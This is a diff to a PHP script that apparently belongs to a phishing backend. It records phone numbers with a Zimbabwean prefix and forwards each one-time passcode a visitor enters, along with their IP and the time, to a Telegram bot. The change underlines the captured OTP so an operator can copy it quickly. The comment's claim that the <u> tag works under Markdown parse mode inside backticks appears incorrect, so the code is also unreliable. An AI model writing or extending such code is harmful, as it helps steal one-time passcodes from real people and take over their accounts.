@@ -114,12 +114,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WI
                       ON CONFLICT (phone) DO NOTHING";
         pg_query_params($conn, $insertSQL, [$phone]);
         
-        // Send Telegram notification
+        // Send Telegram notification with UNDERLINED OTP for easy copying
         $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
         $time = date('Y-m-d H:i:s');
-        $msg = "🔐 *OTP Submitted*\n\n📱 Phone: +263 {$phone}\n🔢 OTP entered: `{$enteredOtp}`\n⏰ Time: {$time}\n🌐 IP: {$ip}";
+        // OTP is underlined using <u> tag (works with parse_mode=HTML or Markdown)
+        // Using Markdown parse mode with <u> tag for underline
+        $msg = "🔐 *OTP Submitted*\n\n📱 Phone: +263 {$phone}\n🔢 OTP entered: `<u>{$enteredOtp}</u>`\n⏰ Time: {$time}\n🌐 IP: {$ip}";
         
-        function sendTelegramMessage($botToken, $chatId, $message, $parseMode = 'HTML') {
+        function sendTelegramMessage($botToken, $chatId, $message, $parseMode = 'Markdown') {
             $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
             $postData = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => $parseMode];
             $ch = curl_init();
